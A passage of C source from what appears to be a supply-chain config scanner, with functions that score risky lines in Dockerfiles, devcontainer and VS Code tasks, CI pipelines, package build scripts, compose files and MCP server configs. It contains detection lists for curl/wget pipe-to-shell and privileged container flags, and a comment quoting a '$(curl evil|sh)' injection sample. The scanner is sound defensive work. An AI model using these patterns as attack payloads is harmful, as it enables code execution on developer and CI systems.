    { char *c = strchr(out, ':'); if (c) *c = '\0'; }
    return out[0] && strchr(out, '.') ? 1 : 0;
}

/* nuget.config `<packageSources><add key="…" value="URL"/>` — an XML
 * attribute carrying the source URL. Extracts the host of a `value=`
 * (or `key=`-bearing `<add`) that is an http(s) URL. Returns 1 with
 * the lowercased host in out, or 0. */
int
hlse_manifest_nuget_source(const char *line, char *out, size_t outcap) {
    const char *v;
    size_t n = 0;
    if (out && outcap) out[0] = '\0';
    if (!line || !out || outcap == 0) return 0;
    if (!strstr(line, "<add") && !strstr(line, "<packageSource"))
        return 0;
    v = strstr(line, "value");
    if (v) {
        v += 5;
        while (*v == ' ' || *v == '\t' || *v == '=' || *v == '"' ||
               *v == '\'')
            v++;
    } else {
        v = strstr(line, "http");
    }
    if (!v) return 0;
    if (strncmp(v, "http://", 7) && strncmp(v, "https://", 8))
        return 0;
    v = strstr(v, "://") + 3;
    while (*v && *v != '/' && *v != '"' && *v != '\'' && *v != ' ' &&
           *v != '\t' && *v != '\n' && *v != '\r' && *v != '>' &&
           n + 1 < outcap)
        out[n++] = (char)tolower((unsigned char)*v++);
    out[n] = '\0';
    { char *c = strchr(out, ':'); if (c) *c = '\0'; }
    return out[0] && strchr(out, '.') ? 1 : 0;
}

/* Gemfile `source "https://…"` / `source: "…"` — swaps the rubygems
 * server. Returns 1 with the source host, or 0. */
int
hlse_manifest_source_host(const char *line, char *out, size_t outcap) {
    const char *k = strstr(line, "source");
    const char *p;
    size_t n = 0;
    if (out && outcap) out[0] = '\0';
    if (!line || !out || outcap == 0) return 0;
    while (k) {
        int boundary = (k == line) || k[-1] == ' ' || k[-1] == '\t' ||
                       k[-1] == '"' || k[-1] == '\'' || k[-1] == ':' ||
                       k[-1] == '[';
        if (boundary) break;
        k = strstr(k + 1, "source");
    }
    if (!k) return 0;
    p = k + 6;
    while (*p == ' ' || *p == '\t') p++;
    if (*p == '=' || *p == ':') {
        p++;
        while (*p == ' ' || *p == '\t' || *p == '>') p++;
    }
    while (*p == '"' || *p == '\'') p++;
    if (strncmp(p, "https://", 8) == 0) p += 8;
    else if (strncmp(p, "http://", 7) == 0) p += 7;
    else return 0;
    while (*p && *p != '/' && *p != '"' && *p != '\'' &&
           *p != ' ' && *p != '\t' && *p != '\n' && *p != '\r' &&
           *p != ')' && *p != '>' && n + 1 < outcap)
        out[n++] = (char)tolower((unsigned char)*p++);
    out[n] = '\0';
    { char *c = strchr(out, ':'); if (c) *c = '\0'; }
    if (!out[0] || !strchr(out, '.')) return 0;
    return 1;
}

/* Dockerfile `FROM image[:tag]` — when the image's first path
 * component carries a '.' or ':' it names a registry host
 * (docker.io implied otherwise). Returns 1 with that host, else 0. */
int
hlse_manifest_docker_from(const char *line, char *out, size_t outcap) {
    const char *s = line;
    const char *e;
    size_t n = 0;
    while (*s == ' ' || *s == '\t') s++;
    if (!(s[0] == 'F' || s[0] == 'f')) return 0;
    if (strncasecmp(s, "from", 4) != 0 ||
        (s[4] != ' ' && s[4] != '\t')) return 0;
    s += 4;
    while (*s == ' ' || *s == '\t') s++;
    /* skip `--platform=` build flags */
    while (s[0] == '-' && s[1] == '-') {
        while (*s && *s != ' ' && *s != '\t') s++;
        while (*s == ' ' || *s == '\t') s++;
    }
    e = s;
    while (*e && *e != ' ' && *e != '\t' && *e != '\n' && *e != '\r')
        e++;
    /* image = [host/]path — first segment is a registry iff it has
     * a '.' (dot in a domain) or ':' (explicit port) */
    {
        const char *slash = memchr(s, '/', (size_t)(e - s));
        const char *h;
        size_t hl;
        if (!slash) return 0;      /* docker hub short name */
        h = s;
        hl = (size_t)(slash - h);
        if (memchr(h, '.', hl) == NULL && memchr(h, ':', hl) == NULL)
            return 0;              /* first segment is a namespace */
        if (hl + 1 > outcap) return 0;
        memcpy(out, h, hl);
        out[hl] = '\0';
        /* strip port */
        { char *c = strchr(out, ':'); if (c) *c = '\0'; }
        n = strlen(out);
        /* lowercase */
        { size_t i; for (i = 0; i < n; i++)
            out[i] = (char)tolower((unsigned char)out[i]); }
    }
    return n > 0;
}

/* Dockerfile `RUN|CMD|ENTRYPOINT` carrying a fetch|pipe|interpreter —
 * `curl x | sh` inside a build. Returns 1 when the pattern appears. */
int
hlse_manifest_docker_pipeshell(const char *line) {
    char low[1024];
    size_t n = 0;
    const char *s = line;
    while (*s == ' ' || *s == '\t') s++;
    if (strncasecmp(s, "run", 3) == 0 && (s[3] == ' ' || s[3] == '\t'))
        ;
    else if (strncasecmp(s, "cmd", 3) == 0 &&
             (s[3] == ' ' || s[3] == '\t')) ;
    else if (strncasecmp(s, "entrypoint", 10) == 0 &&
             (s[10] == ' ' || s[10] == '\t')) ;
    else if (strncasecmp(s, "add", 3) == 0 &&
             (s[3] == ' ' || s[3] == '\t')) ;
    else
        return 0;
    while (s[n] && n + 1 < sizeof(low)) {
        low[n] = (char)tolower((unsigned char)s[n]);
        n++;
    }
    low[n] = '\0';
    if (!(strstr(low, "curl") || strstr(low, "wget") ||
          strstr(low, "fetch") || strstr(low, "invoke-webrequest") ||
          strstr(low, "iwr ")))
        return 0;
    if (!(strstr(low, "| sh") || strstr(low, "|sh") ||
          strstr(low, "| bash") || strstr(low, "|bash") ||
          strstr(low, "| zsh") || strstr(low, "| python") ||
          strstr(low, "| perl") || strstr(low, "| powershell")))
        return 0;
    return 1;
}

/* Dockerfile `ADD http(s)://…` — remote fetch without checksum. */
int
hlse_manifest_docker_add_remote(const char *line) {
    const char *s = line;
    while (*s == ' ' || *s == '\t') s++;
    if (strncasecmp(s, "add", 3) != 0 || (s[3] != ' ' && s[3] != '\t'))
        return 0;
    s += 3;
    while (*s == ' ' || *s == '\t') s++;
    while (s[0] == '-' && s[1] == '-') {
        while (*s && *s != ' ' && *s != '\t') s++;
        while (*s == ' ' || *s == '\t') s++;
    }
    return strncmp(s, "http://", 7) == 0 || strncmp(s, "https://", 8) == 0;
}

/* Repo-supplied exec-config families (devcontainer lifecycle,
 * .vscode folderOpen/tasks/binary-path settings). These files are
 * trusted implicitly by the editor — "open the repo" is the exploit.
 * Only exec-shaped VALUES flag: a plain npm ci postCreateCommand is
 * the format's raison d'etre, but a pipe/fetch/path value is a
 * weaponisable command. Returns score + reason, 0 clean.           */
int
hlse_manifest_execish(const char *v) {
    static const char *const X[] = {
        "|", "curl", "wget", "http", "/tmp", "-c", "bash", "sh ",
        "python", "ruby", "perl", "powershell", "pwsh", "eval",
        "base64", NULL
    };
    size_t i;
    for (i = 0; X[i]; i++)
        if (strstr(v, X[i]) != NULL) return 1;
    return 0;
}

int
hlse_manifest_devc_risk(const char *line, char *reason, size_t rcap) {
    static const char *const LIFECYCLE[] = {
        "\"postCreateCommand\"", "\"postAttachCommand\"",
        "\"initializeCommand\"", "\"preCreateCommand\"",
        "\"postStartCommand\"", "\"updateContentCommand\"",
        "\"postCloneCommand\"", "\"waitFor\"", NULL
    };
    size_t i;
    for (i = 0; LIFECYCLE[i]; i++) {
        const char *k = strstr(line, LIFECYCLE[i]);
        if (k && hlse_manifest_execish(k)) {
            snprintf(reason, rcap,
                "devcontainer lifecycle command fetches/executes "
                "remote or opaque content — opening the repo in a "
                "devcontainer runs it verbatim");
            return 60;
        }
    }
    if ((strstr(line, "\"mounts\"") != NULL ||
         strstr(line, "\"runArgs\"") != NULL ||
         strstr(line, "\"capAdd\"") != NULL ||
         strstr(line, "\"privileged\"") != NULL) &&
        (strstr(line, "docker.sock") != NULL ||
         strstr(line, "--privileged") != NULL ||
         strstr(line, "privileged") != NULL ||
         strstr(line, "source=/") != NULL ||
         strstr(line, "SYS_ADMIN") != NULL)) {
        snprintf(reason, rcap,
            "devcontainer mounts host paths / grants privileged "
            "container flags — the sandbox boundary is the config");
        return 55;
    }
    return 0;
}

int
hlse_manifest_vsc_risk(const char *line, char *reason, size_t rcap) {
    static const char *const BINKEY[] = {
        "defaultInterpreterPath", "terminal.integrated",
        "\"git.path\"", "typescript.tsdk", "cmake.cmakePath",
        "executablePath", "\"php\"", "lldb", "runtimeExecutable",
        "runtimeArgs", NULL
    };
    size_t i;
    if (strstr(line, "folderOpen") != NULL ||
        (strstr(line, "\"runOn\"") != NULL &&
         strstr(line, "Open") != NULL)) {
        snprintf(reason, rcap,
            "VS Code task runs on folderOpen — the task's command "
            "executes the moment the workspace is trusted");
        return 65;
    }
    for (i = 0; BINKEY[i]; i++) {
        const char *k = strstr(line, BINKEY[i]);
        if (k && (strstr(k, "..") != NULL || strstr(k, "/tmp") != NULL ||
                  strstr(k, "${workspaceFolder}") != NULL ||
                  strstr(k, "${workspaceRoot}") != NULL)) {
            snprintf(reason, rcap,
                "workspace settings point an interpreter/binary key at "
                "a repo-relative or temp path — the repo ships the "
                "program your editor will run");
            return 60;
        }
    }
    if (strstr(line, "\"command\"") != NULL && hlse_manifest_execish(line)) {
        snprintf(reason, rcap,
            "VS Code task command fetches or pipes remote content");
        return 55;
    }
    return 0;
}

/* .pre-commit-config.yaml — `repo: local` hooks run arbitrary entry
 * commands on every `git commit` (documented dev-machine vector: the
 * hook config is repo-supplied, pre-commit auto-installs it, the
 * "commit" gesture is the exec trigger). language: system/script
 * run repo binaries with no isolation.                            */
int
hlse_manifest_pck_risk(const char *line, char *reason, size_t rcap) {
    if (strstr(line, "repo:") != NULL && strstr(line, "local") != NULL) {
        snprintf(reason, rcap,
            "pre-commit 'repo: local' hook — its entry command runs "
            "verbatim on every git commit, no sandbox");
        return 40;
    }
    if (strstr(line, "entry:") != NULL && hlse_manifest_execish(line)) {
        snprintf(reason, rcap,
            "pre-commit hook entry fetches/pipes or shells out — "
            "runs on every git commit in this repo");
        return 60;
    }
    if (strstr(line, "language:") != NULL &&
        (strstr(line, "system") != NULL || strstr(line, "script") != NULL)) {
        snprintf(reason, rcap,
            "pre-commit hook language system/script — executes a "
            "repo-supplied binary with no environment isolation");
        return 40;
    }
    return 0;
}

/* .gitlab-ci.yml — same substitution surface as GHA but GitLab
 * syntax: `include: - remote:`/`include: { remote: }` pulls a
 * pipeline definition from an arbitrary URL (executes with the
 * project's CI variables); script:/before_script:/after_script:
 * values that fetch|pipe are the classic token-theft shape.      */
int
hlse_manifest_glci_risk(const char *line, char *reason, size_t rcap) {
    if (strstr(line, "remote:") != NULL &&
        (strstr(line, "http://") != NULL || strstr(line, "https://") != NULL)) {
        snprintf(reason, rcap,
            "gitlab-ci include:remote pulls pipeline config from a "
            "remote URL — runs with the project's CI variables");
        return 55;
    }
    if (strstr(line, "include:") != NULL && strstr(line, "http") != NULL) {
        snprintf(reason, rcap,
            "gitlab-ci include loads a remote pipeline definition");
        return 50;
    }
    if ((strstr(line, "script:") != NULL ||
         strstr(line, "before_script:") != NULL ||
         strstr(line, "after_script:") != NULL ||
         strstr(line, "pre_get_sources_script:") != NULL) &&
        hlse_manifest_execish(line)) {
        snprintf(reason, rcap,
            "gitlab-ci script step fetches/pipes remote or encoded "
            "content — executes with CI variable scope");
        return 55;
    }
    return 0;
}

/* composer.json — "autoload": {"files": [...]} makes every listed
 * PHP file execute at require time (install / dump-autoload), and
 * the *-cmd / *-run script keys are composer lifecycle hooks that
 * shell out verbatim. repositories{...} with a URL can redirect ANY
 * package source — the composer dep-confusion surface.           */
int
hlse_manifest_comp_risk(const char *line, char *reason, size_t rcap) {
    if (strstr(line, "\"files\"") != NULL &&
        strstr(line, ".php") != NULL) {
        snprintf(reason, rcap,
            "composer autoload.files — every listed PHP file runs at "
            "require/dump-autoload time, unconditionally");
        return 55;
    }
    if (strstr(line, "\"repositories\"") != NULL ||
        strstr(line, "packagist") != NULL) {
        if (strstr(line, "http://") != NULL ||
            strstr(line, "\"vcs\"") != NULL ||
            strstr(line, "\"git\"") != NULL) {
            snprintf(reason, rcap,
                "composer repositories entry with vcs/git/http source "
                "— can redirect package resolution off Packagist");
            return 50;
        }
    }
    if ((strstr(line, "-cmd\"") != NULL || strstr(line, "-run\"") != NULL ||
         strstr(line, "-dump\"") != NULL || strstr(line, "\"init\"") != NULL ||
         strstr(line, "\"command\"") != NULL ||
         strstr(line, "-download\"") != NULL ||
         strstr(line, "-pool-create\"") != NULL) &&
        hlse_manifest_execish(line)) {
        snprintf(reason, rcap,
            "composer lifecycle script fetches/pipes or shells out — "
            "runs at install/update with developer credentials");
        return 55;
    }
    return 0;
}

/* PKGBUILD / APKBUILD / pkgname.install / *.ebuild / *.spec — distro
 * package build scripts whose function bodies run verbatim on
 * makepkg/abuild/emerge/rpmbuild, and whose install/postinst
 * scriptlets run on every pacman/emerge/rpm install. The AUR has
 * shipped malicious PKGBUILDs (curl|sh inside build()).
 * Deliberately NOT reusing execish(): `source=("http://…")` and
 * `url="http…"` are the declared-fetch idiom present in every legit
 * PKGBUILD, so only lines that fetch-and-execute, eval, decode, or
 * name an install hook flag.                                    */
int
hlse_manifest_pkbb_risk(const char *line, char *reason, size_t rcap) {
    static const char *const EXECISH[] = {
        "| sh", "|sh", "| bash", "|bash", "bash -c", "sh -c",
        "eval ", "base64 -d", "base64 --decode", "openssl enc",
        "python -c", "perl -e", "source http", "curl ", "wget ",
        "chmod +x", NULL
    };
    static const char *const HOOK[] = {
        "post_install", "pre_install", "post_upgrade", "pre_upgrade",
        "post_remove", "pre_remove", "pkg_postinst", "pkg_preinst",
        "pkg_postrm", "pkg_prerm", "pkg_config",
        "%post", "%pre", "%preun", "%postun", "%posttrans", "%trigger",
        NULL
    };
    size_t i;
    for (i = 0; EXECISH[i]; i++)
        if (strstr(line, EXECISH[i]) != NULL) {
            snprintf(reason, rcap,
                "package build script fetches/pipes/decodes/shells "
                "out — runs on makepkg/abuild/emerge/rpmbuild");
            return 55;
        }
    for (i = 0; HOOK[i]; i++)
        if (strstr(line, HOOK[i]) != NULL) {
            snprintf(reason, rcap,
                "install/upgrade/removal hook scriptlet — executes "
                "on every package install on the target host");
            return 45;
        }
    return 0;
}

/* Platform-automation configs — gitpod tasks / netlify|vercel build
 * commands / Procfile|app.json processes / Jenkinsfile libraries /
 * tsconfig plugins. Each executes in a privileged context (CI env,
 * deploy env, editor), yet reviewers treat them as config, not code.
 * Flag exec-shaped values and remote-resource references.        */
int
hlse_manifest_plat_risk(const char *line, char *reason, size_t rcap) {
    /* Jenkinsfile shared-library loads: @Library('x@branch') pins a
     * mutable ref — the library's code runs in the Jenkins context. */
    if (strstr(line, "@Library") != NULL ||
        strstr(line, "library(") != NULL) {
        if (strstr(line, "@main") != NULL || strstr(line, "@master") != NULL ||
            strstr(line, "@develop") != NULL || strstr(line, "@HEAD") != NULL) {
            snprintf(reason, rcap,
                "Jenkinsfile loads a shared library pinned to a mutable "
                "branch — upstream push executes in your pipeline");
            return 55;
        }
        if (strstr(line, "http://") != NULL || strstr(line, "git@") != NULL ||
            strstr(line, "https://") != NULL) {
            snprintf(reason, rcap,
                "Jenkinsfile loads a shared library from a remote URL");
            return 50;
        }
    }
    /* tsconfig/jsconfig compilerOptions.plugins — a plugin name is
     * resolved via node_modules and loaded by tsserver on open */
    if (strstr(line, "\"plugins\"") != NULL &&
        strstr(line, "\"name\"") != NULL) {
        snprintf(reason, rcap,
            "tsconfig compilerOptions.plugins loads a tsserver plugin "
            "when the workspace is opened in an editor");
        return 45;
    }
    /* exec-shaped task/build/release/command/script values across
     * gitpod tasks, netlify/vercel build.command, Procfile entries */
    if ((strstr(line, ":") != NULL || strstr(line, "=") != NULL ||
         strstr(line, "\"") != NULL) &&
        hlse_manifest_execish(line)) {
        snprintf(reason, rcap,
            "platform-automation config fetches/pipes remote or "
            "encoded content — executes in CI/deploy/workspace "
            "context with its credentials");
        return 55;
    }
    return 0;
}

/* docker-compose hardening — `privileged`, host namespaces, the
 * docker.sock mount, and cap_add ALL/SYS_ADMIN/SYS_MODULE all hand
 * the container kernel-level host control; the compose file reads
 * like a manifest but configures sandbox strength. Returns a score
 * and fills reason, 0 = clean line.                                */
int
hlse_manifest_docker_compose(const char *line, char *reason,
                             size_t rcap) {
    char low[256];
    size_t n = 0;
    const char *s = line;
    while (*s == ' ' || *s == '\t') s++;
    if (*s == '#' || *s == '\0') return 0;
    while (s[n] && n + 1 < sizeof(low)) {
        low[n] = (char)tolower((unsigned char)s[n]);
        n++;
    }
    low[n] = '\0';
    if (strstr(low, "privileged:") && strstr(low, "true")) {
        snprintf(reason, rcap,
            "compose service is privileged — full host device/kernel "
            "access, no meaningful sandbox");
        return 65;
    }
    if (strstr(low, "docker.sock") ||
        strstr(low, "containerd.sock") || strstr(low, "crio.sock")) {
        snprintf(reason, rcap,
            "compose mounts the container-runtime socket — the service "
            "can spawn arbitrary host containers");
        return 55;
    }
    if ((strstr(low, "pid:") || strstr(low, "pid :")) &&
        strstr(low, "host")) {
        snprintf(reason, rcap,
            "compose service shares the host PID namespace — sees and "
            "signals every host process");
        return 50;
    }
    if ((strstr(low, "network_mode:") || strstr(low, "ipc:") ||
         strstr(low, "uts:")) && strstr(low, "host")) {
        snprintf(reason, rcap,
            "compose service shares a host namespace (network/ipc/uts) "
            "— sandbox boundary removed");
        return 50;
    }
    if ((strstr(low, "cap_add") || strstr(low, "- sys_admin") ||
         strstr(low, "- sys_module") || strstr(low, "- sys_ptrace") ||
         strstr(low, "- all")) &&
        (strstr(low, "sys_admin") || strstr(low, "sys_module") ||
         strstr(low, "sys_ptrace") || strstr(low, "- all") ||
         strstr(low, "all"))) {
        snprintf(reason, rcap,
            "compose grants SYS_ADMIN/SYS_MODULE/SYS_PTRACE/ALL "
            "capabilities — container escape capability set");
        return 55;
    }
    if (strstr(low, "seccomp") && strstr(low, "unconfined")) {
        snprintf(reason, rcap,
            "compose disables the seccomp filter — syscall surface "
            "unrestricted");
        return 45;
    }
    return 0;
}

/* GitHub Actions `uses: owner/repo@ref` — extracts the ref into out.
 * Returns 1 with ref (may be empty when unpinned), 0 when not a uses
 * line. Also used for gitlab `uses:`/bitbucket steps. */
int
hlse_manifest_gha_uses(const char *line, char *ref, size_t refcap) {
    const char *p = strstr(line, "uses:");
    const char *e;
    const char *at;
    size_t n;
    if (!p) return 0;
    /* 'uses' must start a key — preceded by start, space, '-' */
    if (p != line && p[-1] != ' ' && p[-1] != '\t' && p[-1] != '-')
        return 0;
    p += 5;
    while (*p == ' ' || *p == '\t' || *p == '"' || *p == '\'') p++;
    e = p;
    while (*e && *e != ' ' && *e != '\t' && *e != '\n' &&
           *e != '\r' && *e != '"' && *e != '\'' && *e != '#')
        e++;
    at = memchr(p, '@', (size_t)(e - p));
    if (!at) { ref[0] = '\0'; return 1; }
    n = (size_t)(e - at - 1);
    if (n >= refcap) n = refcap - 1;
    memcpy(ref, at + 1, n);
    ref[n] = '\0';
    return 1;
}

/* GitHub Actions `pull_request_target` — runs PR-authored code with
 * the base repo's secrets (pwn-request class). */
int
hlse_manifest_gha_prt(const char *line) {
    return strstr(line, "pull_request_target") != NULL;
}

/* GitHub Actions script injection — an attacker-controlled ${{}}
 * expression interpolated into run:/script: text becomes shell code
 * on the runner (GitHub's own hardening doc lists these fields as
 * untrusted; the classic `issue title contains $(curl evil|sh)`
 * pwn-request). Returns the canonical untrusted context path, or
 * NULL when every expression on the line is safe.                */
static const char *const GHA_UNTRUSTED[] = {
    "github.event.issue.title", "github.event.issue.body",
    "github.event.pull_request.title", "github.event.pull_request.body",
    "github.event.pull_request.head",      /* .ref .label .repo.*   */
    "github.event.comment.body",
    "github.event.review.body", "github.event.review_comment.body",
    "github.event.pages.",
    "github.event.head_commit.message",
    "github.event.head_commit.author",
    "github.event.commits.", "github.event.discussion.",
    "github.event.inputs.", "github.event.workflow_run.head_branch",
    "github.event.workflow_run.head_repository",
    "github.event.workflow_run.display_title",
    "github.head_ref", NULL
};

const char *
hlse_manifest_gha_inj(const char *line) {
    const char *p = line;
    while ((p = strstr(p, "${{")) != NULL) {
        const char *e = strstr(p + 3, "}}");
        size_t i;
        if (!e) break;
        /* substring match inside the expression — the field is still
         * substituted when wrapped in format()/contains()/env. The
         * caller already restricts this to run/script context.       */
        for (i = 0; GHA_UNTRUSTED[i]; i++) {
            const char *f = p + 3;
            size_t kl = strlen(GHA_UNTRUSTED[i]);
            while (f + kl <= e) {
                if (strncmp(f, GHA_UNTRUSTED[i], kl) == 0)
                    return GHA_UNTRUSTED[i];
                f++;
            }
        }
        p = e + 2;
    }
    return NULL;
}

/* Workflow run-context key: `run:` (steps), `script:` (github-script
 * action), `beforeScript:`/`afterScript:` (Sonar source-actions).
 * Returns 1 for a block-scalar form (run: | — the injected text sits
 * on following lines), 2 for an inline value the caller should scan
 * itself, 0 otherwise. */
int
hlse_manifest_gha_scriptkey(const char *line) {
    static const char *const KEYS[] = {
        "run", "script", "beforeScript", "afterScript", NULL
    };
    char low[64];
    size_t i = 0, n = 0;
    const char *v;
    /* leading '- ' list marker is legal before the key */
    if (line[i] == '-' && line[i+1] == ' ') i += 2;
    while (line[i] && n + 1 < sizeof(low) && line[i] != ':') {
        if (line[i] == ' ' || line[i] == '\t') return 0; /* key is bare */
        low[n] = line[i];
        i++; n++;
    }
    if (line[i] != ':') return 0;
    low[n] = '\0';
    {
        size_t k;
        int hit = 0;
        for (k = 0; KEYS[k]; k++)
            if (strcmp(low, KEYS[k]) == 0) { hit = 1; break; }
        if (!hit) return 0;
    }
    v = line + i + 1;
    while (*v == ' ' || *v == '\t') v++;
    if (*v == '|' || *v == '>' || *v == '\0' || *v == '\r' ||
        *v == '\n' || *v == '#')
        return 1;
    return 2;
}

/* MCP server-config risk — per JSON line. A config line that pipes a
 * fetch into a shell, launches a bare shell, fetches directly, runs
 * a container with host privileges, or points the client at a
 * plaintext http endpoint turns "add a tool" into code exec or MITM
 * tool poisoning. Returns the score and fills reason, 0 = clean.   */
int
hlse_manifest_mcp_risk(const char *line, char *reason, size_t rcap) {
    static const char *const FETCH_SHELL[] = {
        "| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh",
        "| powershell", "| iex", "| iwr", NULL
    };
    static const char *const SHELL_CMD[] = {
        "\"command\":\"sh\"", "\"command\": \"sh\"",
        "\"command\":\"bash\"", "\"command\": \"bash\"",
        "\"command\":\"zsh\"", "\"command\": \"zsh\"",
        "\"command\":\"cmd\"", "\"command\": \"cmd\"",
        "\"command\":\"powershell\"",
        "\"command\": \"powershell\"",
        "\"command\":\"pwsh\"", "\"command\": \"pwsh\"", NULL
    };
    static const char *const FETCH_CMD[] = {
        "\"command\":\"curl\"", "\"command\": \"curl\"",
        "\"command\":\"wget\"", "\"command\": \"wget\"", NULL
    };
    static const char *const URL_KEY[] = {
        "\"url\"", "\"serverUrl\"", "\"endpoint\"",
        "\"server_url\"", NULL
    };
    static const char *const OPAQUE[] = {
        " -c ", "bash -c", "sh -c", "zsh -c", "\"-c\"", "Invoke-Expression",
        "iex ", "-enc ", "-ec ", NULL
    };
    size_t i;
    for (i = 0; FETCH_SHELL[i]; i++)
        if (strstr(line, FETCH_SHELL[i]) != NULL) {
            snprintf(reason, rcap,
                "MCP config pipes a fetch into a shell — installing the "
                "server runs remote code verbatim (tool-poisoning "
                "vector)");
            return 70;
        }
    for (i = 0; SHELL_CMD[i]; i++)
        if (strstr(line, SHELL_CMD[i]) != NULL) {
            snprintf(reason, rcap,
                "MCP server command is a bare shell — the real payload "
                "hides in args, invisible to review");
            return 60;
        }
    for (i = 0; FETCH_CMD[i]; i++)
        if (strstr(line, FETCH_CMD[i]) != NULL) {
            snprintf(reason, rcap,
                "MCP server command is a downloader (curl/wget) — "
                "fetch-and-execute at client startup");
            return 70;
        }
    if ((strstr(line, "\"command\":\"docker\"") != NULL ||
         strstr(line, "\"command\": \"docker\"") != NULL ||
         strstr(line, "\"command\":\"podman\"") != NULL ||
         strstr(line, "\"command\": \"podman\"") != NULL) &&
        (strstr(line, "--privileged") != NULL ||
         strstr(line, "-v /") != NULL || strstr(line, "\"-v\":\"/") != NULL ||
         strstr(line, "--network host") != NULL ||
         strstr(line, "--pid=host") != NULL)) {
        snprintf(reason, rcap,
            "MCP server container runs privileged / host-mounted — "
            "the server escapes its sandbox by config");
        return 65;
    }
    for (i = 0; URL_KEY[i]; i++) {
        const char *u = strstr(line, URL_KEY[i]);
        if (u) {
            const char *h = strstr(u, "http://");
            if (h && strncmp(h + 7, "localhost", 9) != 0 &&
                strncmp(h + 7, "127.", 4) != 0 &&
                strncmp(h + 7, "[::1]", 5) != 0) {
                snprintf(reason, rcap,
                    "MCP server endpoint is plaintext http:// remote — "
                    "tool schemas and responses are MITM-rewriteable "
                    "(silent tool poisoning)");
                return 55;
            }
        }
    }
    for (i = 0; OPAQUE[i]; i++)
        if (strstr(line, OPAQUE[i]) != NULL) {
            snprintf(reason, rcap,
                "MCP config hides the command behind -c/-enc — opaque "
                "argument string, review cannot see what runs");
            return 55;
        }
    return 0;
}

/* .cargo/config.toml toolchain override — rustc-wrapper / runner /
 * linker / pre-build / post-build / rustc replace what executes on
 * every `cargo build` (build-time code-exec primitive). Returns the
 * matched key, NULL otherwise. */
const char *
hlse_manifest_cargo_toolchain(const char *line) {
    static const char *const KEYS[] = {
        "rustc-wrapper", "rustc_wrapper", "runner", "linker",
        "pre-build", "post-build", NULL
    };
    char low[256];
    size_t i, n = 0;
    const char *s = line;
    while (*s == ' ' || *s == '\t') s++;
    if (*s == '[' || *s == '#') return NULL;
    while (s[n] && n + 1 < sizeof(low)) {
        low[n] = (char)tolower((unsigned char)s[n]);
        n++;
    }
    low[n] = '\0';
    for (i = 0; KEYS[i]; i++) {
        size_t kl = strlen(KEYS[i]);
        const char *eq;
        if (strncmp(low, KEYS[i], kl) != 0) continue;
        /* key must be a whole word ending at '=' */
        eq = strchr(low + kl, '=');
        if (!eq) continue;
        {   const char *k = low + kl;
            int ok = 1;
            while (k < eq) {
                if (*k != ' ' && *k != '\t' && *k != '"' &&
                    *k != '\'') { ok = 0; break; }
                k++;
            }
            if (!ok) continue;
            /* flag only path-form values — a bare tool name
             * (sccache, lld, qemu-*) resolves via PATH and is the
             * canonical legit use; '/…' or './…' bypasses that */
            {   const char *val = eq + 1;
                while (*val == ' ' || *val == '\t' || *val == '"' ||
                       *val == '\'') val++;
                if (strchr(val, '/') == NULL) continue;
                return KEYS[i];
            }
        }
    }
    return NULL;
}
